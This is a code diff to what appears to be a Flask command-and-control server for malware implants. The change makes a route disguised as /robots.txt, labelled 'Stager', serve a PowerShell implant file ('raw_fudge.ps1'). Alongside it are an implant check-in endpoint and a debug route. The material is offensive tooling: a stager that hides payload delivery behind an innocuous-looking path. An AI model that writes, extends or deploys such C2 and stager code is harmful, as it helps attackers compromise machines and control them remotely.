@@ -1,4 +1,4 @@
-from flask import Flask, render_template, flash, request, jsonify, g, current_app,url_for, redirect, make_response
+from flask import Flask, render_template, flash, request, jsonify, g, current_app,url_for, redirect, make_response, send_file, send_from_directory
 import base64
 #from Controller import OnlyOne
 from Implant import ImplantSingleton
@@ -24,7 +24,8 @@ def add_header( r):
 
 @app.route("/robots.txt",methods=['GET'])
 def Stager():
-    return
+    # This needs to return the implant!
+    return send_file('implant_core/raw_fudge.ps1')
 
 @app.route("/index", methods=['GET','POST'])
 def ImplantCheckIn():
@@ -59,6 +60,8 @@ def getNode(id):
 @app.route("/aaa",methods=["GET"])
 def testing():
     print(implant.instance)
+
+
 
 
 
